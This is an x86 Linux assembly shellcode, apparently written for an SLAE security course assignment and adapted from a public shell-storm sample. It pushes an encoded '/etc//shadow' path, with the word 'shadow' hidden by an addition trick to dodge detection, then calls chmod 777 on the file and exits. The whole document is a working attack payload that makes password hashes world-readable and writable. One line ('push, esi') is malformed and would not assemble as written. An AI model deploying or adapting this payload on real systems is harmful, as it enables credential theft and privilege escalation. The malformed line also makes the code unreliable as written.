;; SLAE Assignment #6: Modified Shellcode chmod 777 shadow
;; Website:  http://blog.jsiob.com
;; SLAE-ID: 1400
;; Original ShellCode:  http://shell-storm.org/shellcode/files/shellcode-590.php

global _start			

section .text
_start:

	xor ecx, ecx
	mul ecx
	push ecx		
	mov esi, 0x665e5350				; Substruction operation the hide the "shadow“ word
 	add esi, 0x11111111		
	
	push, esi			
	push dword 0x68732f63	
	push dword 0x74652f2f
	
	mov ebx,esp	
	mov cx,0x1ff
	mov al,0xf
	int 0x80
	inc eax
	int 0x80
